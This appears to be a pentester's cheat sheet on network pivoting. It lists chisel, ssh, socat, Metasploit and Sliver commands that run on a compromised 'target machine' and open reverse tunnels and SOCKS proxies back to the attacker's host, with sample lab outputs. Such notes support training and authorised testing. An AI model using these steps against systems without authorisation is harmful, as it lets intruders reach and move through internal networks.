---
title: "Network Traffic Pivoting"
date: 2024-6-26
tags: ["Pivoting", "Sliver", "Pivot", "Chisel", "Ssh", "Network", "Socat", "Port Forwarding", "Tunneling", "Metasploit"]
---

### Tunneling

{{< tab set1 tab1 active >}}Chisel{{< /tab >}}
{{< tab set1 tab2 >}}ssh{{< /tab >}}
{{< tab set1 tab3 >}}socat{{< /tab >}}
{{< tab set1 tab4 >}}metasploit{{< /tab >}}
{{< tab set1 tab5 >}}sliver{{< /tab >}}
{{< tabcontent set1 tab1 >}} 

#### Start a local chisel Server

```console
# In our local Linux machine
./chisel server --reverse --port <LOCAL_PORT>
```

```console {class="sample-code"}
$ ./chisel server --reverse --port 8000 
2024/09/23 12:27:03 server: Reverse tunnelling enabled
2024/09/23 12:27:03 server: Fingerprint ikFn6iQOOodxIlcDQI4dvFu1pdHgV5UnHRenxUg0eho=
2024/09/23 12:27:03 server: Listening on http://0.0.0.0:8000
```

#### Ports forwarding

```console
# In target machine
./chisel client <LOCAL_IP>:<LOCAL_PORT> R:<TARGET_PORT>:127.0.0.1:<TARGET_PORT>
```

```console
# Mutiple ports fowarding, can be different targets in the same subnet
./chisel client <LOCAL_IP>:<LOCAL_PORT> R:8080:172.17.0.2:8080 R:5000:172.17.0.3:5000
```

#### Socks5

```console
# In our local Linux machine
sudo nano /etc/proxychains4.conf
```

```console
# Add to the end of the file
socks5 127.0.0.1 1081
```

```console
# In target machine
./chisel client <LOCAL_IP>:<LOCAL_PORT> R:1081:socks
```

```console {class="sample-code"}
$ ./chisel client 10.10.14.31:8000 R:1081:socks
2024/09/23 04:16:44 client: Connecting to ws://10.10.14.31:8000
2024/09/23 04:16:44 client: Connected (Latency 47.945673ms)
```

```console
# Usage, in our local machine
proxychains4 curl http://127.0.0.1:1081
```

<small>*Ref: [chisel](https://github.com/jpillora/chisel)*</small>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

```console
# SSH port forwarding without spawning a shell
ssh -N -L <TARGET_PORT>:127.0.0.1:<TARGET_PORT> <USER>@<TARGET>
```

```console {class=sample-code}
$ ssh -N -L 5985:127.0.0.1:5985 3v4Si0N@10.10.10.240
3v4Si0N@10.10.10.240's password:  
```

```console
# SSH socks5 tunneling without spawning a shell
ssh -N -D 1081 <USER>@<TARGET>
```

```console {class=sample-code}
$ ssh -i id_rsa -N -D 1081 root@10.10.11.179
```

{{< /tabcontent >}}
{{< tabcontent set1 tab3 >}}

```console
# Any traffic go to port <TARGET_PORT> will be forwarded to <LOCAL_IP>:<TARGET_PORT>
./socat tcp-listen:<TARGET_PORT>,fork tcp:<LOCAL_IP>:<TARGET_PORT> &
```

{{< /tabcontent >}}
{{< tabcontent set1 tab4 >}}

#### Ports forwarding

```console
# Add
portfwd add -l <TARGET_PORT> -r 127.0.0.1 -p <TARGET_PORT>
```

```console
# Delete
portfwd delete -l <TARGET_PORT> -r 127.0.0.1 -p <TARGET_PORT>
```

#### Socks5

```console
# First add routes to target subnet
use post/multi/manage/autoroute
```

```console
set session <ID>
```

```console
run
```

```console
# Then create socks proxy
use auxiliary/server/socks_proxy
```

```console
run
```

{{< /tabcontent >}}
{{< tabcontent set1 tab5 >}}

```console
socks5 start
```

{{< /tabcontent >}}
